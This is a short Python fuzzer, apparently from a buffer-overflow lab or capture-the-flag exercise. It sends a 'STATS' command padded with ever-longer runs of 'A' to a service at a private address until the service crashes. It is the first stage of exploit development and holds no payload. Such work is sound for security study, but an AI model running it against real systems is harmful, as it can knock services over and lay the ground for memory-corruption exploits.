#!/usr/bin/env python3
import socket, time, sys

ip = "10.10.11.32"
port = 1337
prefix = "STATS "

timeout = 5
string = prefix + "A" * 100

print("================[ Fuzzing Start ]=================")
while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("[+] Fuzzing {} bytes...".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("-" * 50)
    print("\033[38;5;208m[!]\033[0;0m Program crashed at\033[92m {}\033[00m bytes !".format(len(string) - len(prefix)))
    print("-" * 50)
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
